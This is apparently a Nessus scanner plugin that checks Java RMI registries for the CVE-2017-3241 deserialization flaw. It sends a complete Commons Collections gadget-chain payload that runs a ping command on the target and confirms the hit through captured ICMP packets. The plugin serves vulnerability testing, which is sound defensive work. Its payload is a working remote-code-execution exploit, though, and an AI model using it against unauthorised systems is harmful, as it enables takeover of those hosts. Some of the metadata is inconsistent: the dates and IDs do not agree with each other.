#
#

include("compat.inc");

if (description)
{
  script_id(51799225);
  script_version("1.7");
  script_cve_id("CVE-2017-3241");
  script_bugtraq_id(51799225);
  script_name(english:" Oracle Java SE and JRockit CVE-2017-3241 Remote Security Vulnerability");
  script_summary(english:" Oracle Java SE and JRockit CVE-2017-3241 Remote Security Vulnerability");
  script_set_attribute(attribute:"description", value:"Vulnerability in the Java SE, Java SE Embedded, JRockit component of Oracle Java SE (subcomponent: RMI). Supported versions that are affected are Java SE: 6u131, 7u121 and 8u112; Java SE Embedded: 8u111; JRockit: R28.3.12. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded, JRockit. While the vulnerability is in Java SE, Java SE Embedded, JRockit, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in takeover of Java SE, Java SE Embedded, JRockit. Note: This vulnerability can only be exploited by supplying data to APIs in the specified Component without using Untrusted Java Web Start applications or Untrusted Java applets, such as through a web service.");
  script_set_attribute(attribute:"solution", value:"Upgrade to http://www.oracle.com/technetwork/security-advisory/cpujan2017-2881727.html.");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_core", value:"true");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_set_attribute(attribute:"risk_factor", value:"High");
  script_set_attribute(attribute:"vuln_publication_date", value:"2016/06/14");
  script_set_attribute(attribute:"patch_publication_date", value:"2016/06/01");
  script_set_attribute(attribute:"plugin_publication_date", value:"2016/07/13");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"Web Servers");

  script_copyright(english:"This script is Copyright (C) 2016-2019 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("rmiregistry_detect.nasl");
  script_require_ports("Services/rmi_registry", 1099);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("install_func.inc");
include("byte_func.inc");
include("audit.inc");
include("dump.inc");
include("rmi.inc");

os = get_kb_item_or_exit("Host/OS");
port = get_kb_item("Services/rmi_registry");
soc = rmi_connect(port:port);


ping_cmd = '';
laddress = compat::this_host();
pattern = hexstr(rand_str(length:8));
if("windows" >< tolower(os))
{
    ping_cmd = "ping -n 10 "+ laddress;
}
else{
    ping_cmd = "ping -c 10 -p "+ pattern + " " + laddress;
}
cmdlen = strlen(ping_cmd);

#head = hex2raw(s:"4a524d4900024b");

host = compat::this_host();
req2_1 =                             # client's default endpoint
  mkword(strlen(host)) + host +      #   hostname
  mkword(0) + mkword(0);             #   port
req2_2 =
  mkbyte(0x50) +                     # message (0x50 => CallData)
                                     # serialized object
    mkword(0xaced) +                 #   stream magic
    mkword(0x05) +                   #   stream version
    mkbyte(0x77) +                   #   blockdata
      mkbyte(0x22) +                 #     size
      raw_string(                    #     data
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x01, 0x44, 0x15, 0x4d, 0xc9, 0xd4, 0xe6,
        0x3b, 0xdf
      );
#send(socket:soc, data:req2_1+req2_2);
#sleep(1);


serObj = hex2raw(s:"50aced00057722000000000000000000000000000000000000000000000000000044154dc9d4e63bdf74001370776e65643239363537313435323131313735737d00000001000f6a6176612e726d692e52656d6f746570787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b7078707372003273756e2e7265666c6563742e616e6e6f746174696f6e2e416e6e6f746174696f6e496e766f636174696f6e48616e646c657255caf50f15cb7ea50200024c000c6d656d62657256616c75657374000f4c6a6176612f7574696c2f4d61703b4c0004747970657400114c6a6176612f6c616e672f436c6173733b707870737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c647078703f4000000000000c7708000000100000000171007e00007371007e0005737d00000001000d6a6176612e7574696c2e4d6170707871007e00027371007e00057372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b7078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b7078707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d8341899020000707870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e747400124c6a6176612f6c616e672f4f626a6563743b707870767200116a6176612e6c616e672e52756e74696d6500000000000000000000007078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b707870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c0200007078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a99020000707870000000007400096765744d6574686f647571007e002400000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb3420200007078707671007e00247371007e001c7571007e002100000002707571007e002100000000740006696e766f6b657571007e002400000002767200106a6176612e6c616e672e4f626a65637400000000000000000000007078707671007e00217371007e001c757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b47020000707870000000017400");

serObj += raw_string(cmdlen) + raw_string(ping_cmd);

serObj += hex2raw(s:"740004657865637571007e00240000000171007e00297371007e0017737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c756570787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000707870000000017371007e00093f40000000000000770800000010000000007878767200126a6176612e6c616e672e4f76657272696465000000000000000000000070787071007e003f7871007e003f");

filter = "icmp and icmp[0] = 8 and src host " + get_host_ip();
#response = send_capture(socket:soc, data:head, pcap_filter:filter);
#sleep(1);
response = send_capture(socket:soc, data:req2_1+req2_2, pcap_filter:filter);
sleep(1);
response2 = send_capture(socket:soc, data:serObj, pcap_filter:filter);
icmp = tolower(hexstr(get_icmp_element(icmp:response2, element:"data")));
close(soc);

if("windows" >< tolower(os) && !isnull(icmp)){
	report =
		'\nScanner was able to exploit a deserialization vulnerability by' +
		'\nsending a crafted Java object.' +
		'\n\n\n'+hexdump(ddata:serObj);
	security_hole(port:port, extra:report);
}
if (pattern >< icmp && !isnull(icmp)){
	report =
		'\nScanner was able to exploit a Linux deserialization vulnerability by' +
		'\nsending a crafted Java object.' +
		'\n\n\n'+hexdump(ddata:serObj);
	security_hole(port:port, extra:report);
}
exit(0);
